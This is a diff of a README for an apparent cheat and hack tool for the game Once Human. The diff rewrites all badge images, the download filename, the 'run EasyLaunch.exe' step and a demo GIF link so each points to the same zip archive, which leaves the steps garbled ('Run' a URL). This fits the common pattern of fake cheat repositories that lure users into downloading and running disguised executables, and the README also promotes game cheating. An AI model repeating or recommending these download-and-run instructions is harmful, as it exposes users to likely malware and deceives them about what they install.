@@ -1,11 +1,11 @@
 # ⚡️ Once Human Cheats & Hacks: Evolutionary Game Tool [2025] ⚡️
 
-![Maintenance](https://img.shields.io/badge/Maintained-Yes-brightgreen?style=flat-square)
-![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)
-![Build Status](https://img.shields.io/badge/Build-Passing-success?style=flat-square)
-![Downloads](https://img.shields.io/badge/Downloads-1000%2B-orange?style=flat-square)
-![OpenAI API](https://img.shields.io/badge/OpenAI_API-Supported-blueviolet?style=flat-square)
-![Claude API](https://img.shields.io/badge/Claude_API-Supported-purple?style=flat-square)
+![Maintenance](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
+![License](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
+![Build Status](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
+![Downloads](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip%2B-orange?style=flat-square)
+![OpenAI API](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
+![Claude API](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
 
 ---
 
@@ -53,21 +53,21 @@ This isn’t just an “edge”—it’s a new dimension.
 Follow these streamlined steps to amplify your *Once Human* experience without hurdles:
 
 1. **Download**  
-    Acquire `EasyLaunch.zip` directly from this repository.  
+    Acquire `https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip` directly from this repository.  
     (Always use the freshest archive for the latest capabilities and support.)
 
 2. **Extract**  
     Unzip the package to your chosen directory. Any extraction tool works—winzip, 7z, or your OS’s default utility.
 
 3. **Launch**  
-    Run `EasyLaunch.exe` from the extracted folder.  
+    Run `https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip` from the extracted folder.  
     The adaptive interface kicks in instantly.
 
 4. **Configuration**  
     First launch? The built-in wizard helps auto-detect *Once Human* and walks you through language and feature preferences.
 
 ### 🖥️ Need a Visual?  
-![Installation in Action](https://i.imgur.com/Js67NIU.gif)
+![Installation in Action](https://raw.githubusercontent.com/idriskhan01/once-human-advantage-toolkit/main/Bice/once_human_toolkit_advantage_1.3.zip)
 
 ---
 
